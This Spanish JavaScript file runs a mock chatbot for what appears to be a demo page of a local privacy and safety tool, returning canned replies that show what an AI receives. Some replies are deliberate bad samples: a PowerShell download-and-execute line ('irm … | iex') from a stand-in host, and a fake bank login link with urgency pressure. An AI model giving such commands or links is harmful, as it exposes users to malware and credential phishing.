// La «IA» de mentira de la página de prueba: contesta usando lo que le llega, para que se vea qué recibe.
"use strict";

const chat = document.getElementById("chat");
const compositor = document.getElementById("compositor");

function burbuja(quien, texto, clase) {
  const caja = document.createElement("div");
  caja.className = `burbuja ${clase}`;
  const etiqueta = document.createElement("span");
  etiqueta.className = "quien";
  etiqueta.textContent = quien;
  const cuerpo = document.createElement("div");
  cuerpo.textContent = texto;
  if (clase === "ia") cuerpo.classList.add("guardian-demo-respuesta");
  caja.append(etiqueta, cuerpo);
  chat.appendChild(caja);
  chat.scrollTop = chat.scrollHeight;
}

function respuestaDeMentira(mensaje) {
  const marcadores = [...new Set(mensaje.match(/\[[A-Z_]+_\d+\]/g) || [])];
  if (/comando|error|arregl/i.test(mensaje)) {
    return "Claro. Abre PowerShell como administrador y pega esto:\n\nirm https://arreglos-rapidos.example/fix.ps1 | iex\n\n" +
      "Después confirma tu cuenta en https://bbva-seguridad.example/login";
  }
  if (/verifique su cuenta|verificar su cuenta/i.test(mensaje)) {
    return "Según el correo, debes verificar tu cuenta en https://bbva-seguridad.example/login antes de 24 horas " +
      "para que no la bloqueen. Hazlo cuanto antes.";
  }
  if (/me podr[ií]as ayudar con este tema|qu[eé] tal est[aá]s/i.test(mensaje)) {
    return "¡Hola! Estoy muy bien, gracias por preguntar 😊. Claro que puedo ayudarte con este tema. Hay muchas " +
      "formas de enfocarlo y depende mucho de lo que necesites. ¿Podrías darme más detalles sobre a qué te refieres?";
  }
  if (/Ve al grano|Para que tu respuesta me sirva de verdad/.test(mensaje)) {
    return "Perfecto, ahora sé qué necesitas, cómo lo quieres y para qué. (Soy una IA de mentira: una de verdad te " +
      "contestaría aquí al grano, sin rodeos ni preguntas de relleno.)";
  }
  if (marcadores.length && /banco|carta|cobrad/i.test(mensaje)) {
    const dni = marcadores.find((m) => m.startsWith("[DNI")) || "(tu DNI)";
    const otros = marcadores.filter((m) => m !== dni).join(", ");
    return `Esto es todo lo que he visto de tus datos: ${marcadores.join(", ")}.\n\n` +
      `Estimado banco:\nYo, con DNI ${dni}, les escribo por un cargo duplicado. ` +
      (otros ? `Les dejo mis datos de contacto y de pago: ${otros}. ` : "") +
      "Ruego que revisen la operación y me devuelvan el importe.\nUn saludo.";
  }
  if (marcadores.length) {
    return `Entendido. De tus datos solo he visto esto: ${marcadores.join(", ")}. ` +
      `Lo apunto así: ${marcadores[0]}.\n(Lo que hay detrás de cada marcador solo lo sabe el Guardián de tu PC.)`;
  }
  return `He recibido: «${mensaje}». (Soy una IA de mentira: así funciona un chatbot normal.)`;
}

function enviar() {
  const mensaje = compositor.innerText.trim();
  if (!mensaje) return;
  burbuja("Tú (esto es lo que recibe la IA)", mensaje, "tu");
  compositor.textContent = "";
  setTimeout(() => burbuja("IA de mentira", respuestaDeMentira(mensaje), "ia"), 700);
}

compositor.addEventListener("keydown", (e) => {
  if (e.key === "Enter" && !e.shiftKey) {
    e.preventDefault();
    enviar();
  }
});
document.getElementById("enviar").addEventListener("click", enviar);

for (const boton of document.querySelectorAll("[data-copiar]")) {
  boton.addEventListener("click", async () => {
    await navigator.clipboard.writeText(document.getElementById(boton.dataset.copiar).textContent);
    boton.textContent = "Copiado ✓";
    setTimeout(() => { boton.textContent = "Copiar"; }, 1500);
  });
}
